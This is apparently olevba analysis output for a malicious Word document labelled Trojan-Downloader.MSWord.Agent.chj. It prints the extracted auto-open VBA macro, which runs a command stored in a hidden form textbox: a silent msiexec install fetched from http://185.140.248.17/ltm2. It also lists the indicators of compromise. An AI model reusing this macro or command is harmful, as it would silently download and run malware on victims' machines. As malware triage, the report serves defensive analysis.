olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Downloader.MSWord.Agent.chj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan-Downloader.MSWord.Agent.chj - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_open()
Dim time
time = Format(Now + TimeSerial(0, 0, 37), "hh:mm")


Shell Replace(UserForm1.TextBox1.Text, "11:11", time)
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: ./Trojan-Downloader.MSWord.Agent.chj - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Downloader.MSWord.Agent.chj' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
msiexec /q step1=commonl step2=files /i http://185.140.248.17/ltm2
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Downloader.MSWord.Agent.chj' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaH
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN './Trojan-Downloader.MSWord.Agent.chj' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'msiexec /q step1=commonl step2=files /i http://185.140.248.17/ltm2'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://185.140.248.1|URL                                          |
|          |7/ltm2              |                                             |
|IOC       |185.140.248.17      |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+

